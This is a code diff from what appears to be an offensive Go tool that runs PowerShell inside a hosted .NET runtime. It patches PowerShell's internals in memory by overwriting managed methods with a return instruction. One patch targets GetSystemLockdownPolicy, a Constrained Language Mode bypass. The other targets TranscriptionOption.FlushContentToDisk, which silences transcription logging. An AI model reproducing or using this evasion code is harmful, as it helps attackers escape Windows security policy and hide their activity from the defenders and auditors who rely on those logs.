@@ -75,7 +75,12 @@ func ExecuteScript(appDomain *clr.AppDomain, vtPowershell clr.Variant, script st
 	res += inf
 
 	//err = clr.VariantClear(&vtInvokeResult)
-	fmt.Println("Invoking Clear")
+	fmt.Println("Invoking Clear Errors")
+	_, err = PowerShellClearErrors(appDomain, vtPowershell)
+	if err != nil && err.Error() != "The operation completed successfully." {
+		return err.Error(), err
+	}
+	fmt.Println("Invoking Clear Commands")
 	_, err = PowerShellClear(appDomain, vtPowershell)
 	if err != nil && err.Error() != "The operation completed successfully." {
 		return err.Error(), err
@@ -88,8 +93,11 @@ func ExecuteScript(appDomain *clr.AppDomain, vtPowershell clr.Variant, script st
 }
 
 func PatchManagedFunction(appDomain *clr.AppDomain, assemblyName string, className string, methodName string, nbarg uint32, bufbyte []byte) error {
-	addr, err := GetFunctionAddress(appDomain, assemblyName, className, methodName, nbarg)
+	addr, err := GetFunctionAddressJIT(appDomain, assemblyName, className, methodName, nbarg)
+	fmt.Println(fmt.Sprintf("Address of %s", methodName))
+	fmt.Println(fmt.Sprintf("%0x", addr))
 	if err != nil && err.Error() != "The operation completed successfully." {
+		fmt.Println("Error while patching function ->", err.Error())
 		return err
 	}
 	return PatchFunction(addr, bufbyte)
@@ -106,8 +114,8 @@ func PatchSystemPolicyGetSystemLockdownPolicy(appDomain *clr.AppDomain) error {
 func PatchTranscriptionOptionFlushContentToDisk(appDomain *clr.AppDomain) error {
 	buf := []byte{ 0xc3 }
 	return PatchManagedFunction(appDomain, "System.Management.Automation",
-		"System.Management.Automation.Security.SystemPolicy",
-		"GetSystemLockdownPolicy",
+		"System.Management.Automation.Host.TranscriptionOption",
+		"FlushContentToDisk",
 		0, buf)
 }
 
